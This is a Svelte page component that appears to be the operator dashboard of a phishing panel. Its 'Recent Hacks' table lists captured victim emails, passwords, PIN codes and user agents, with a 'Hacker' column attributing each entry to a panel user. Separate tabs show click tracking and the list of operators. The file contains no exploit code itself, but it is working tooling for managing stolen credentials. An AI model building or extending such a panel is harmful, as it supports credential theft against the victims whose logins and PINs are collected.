<script>
    import HackData from "$lib/components/HackData.svelte";
    import ClickData from "$lib/components/ClickData.svelte";
    import { allClicksList, allHacksList } from "$lib/stores/user-store";
    import { onMount } from "svelte";
    import { getAllUsers, getUser } from "$lib/users";
    import UserListItem from "$lib/components/UserListItem.svelte";

  

    let activeItem = "hacks";

    function setActive(text) {
        activeItem = text;
    }


</script>

<div style="padding: 8px;">
    <!-- <CreateUser /> -->
</div>
<div class="tab-wrapper">
    <button
        class:activeBtn={activeItem === "hacks"}
        on:click={() => setActive("hacks")}
        >Recent Hacks {$allHacksList.length.toString()}</button
    >

    <button
        class:activeBtn={activeItem === "users"}
        on:click={() => setActive("users")}>All users</button
    >
</div>

{#if activeItem === "hacks"}
    <div class="center">
        <table>
            <tr style="border:1px solid blue;">
                <th>Time</th>
                <th>Hacker</th>
                <th>Email</th>
                <th>Password</th>
                <th>Pin-code</th>
                <th>UserAgent</th>
                <th>Actions</th>
            </tr>

            {#each $allHacksList as hack}
                <HackData {hack} admin="true" isShowHacker={true}/>
            {/each}
        </table>
    </div>
{/if}
{#if activeItem === "clicks"}
    <div class="wrapped">
        {#each $allClicksList as click}
            <ClickData {click} />
        {/each}
    </div>
{/if}
{#if activeItem === "users"}
    <div style="display: flex; justify-content: center; padding-top: 20px; ">
        <UserListItem />
    </div>
{/if}

<style>
    .center {
        display: grid;
        place-items: center;
        margin-top: 12px;
    }
    .tab-wrapper {
        display: flex;
        align-items: center;
        justify-content: center;
    }
    .tab-wrapper > * {
        width: 132px;
    }
    table {
        border-spacing: 8px;
        padding: 6px 12px;
        border: 1px solid gray;
        border-radius: 8px;
        margin: 8px;
        background-color: #003362;
        color:white
    }
    th {
        text-align: start;
    }
    .activeBtn {
        background-color: rgb(36, 23, 83);
        color: white;
        border-color: rgb(36, 23, 83);
    }
    button {
        padding: 1ch;
    }

    .wrapped {
        display: flex;
        flex-wrap: wrap;
        padding: 1ch 2ch;
    }
</style>
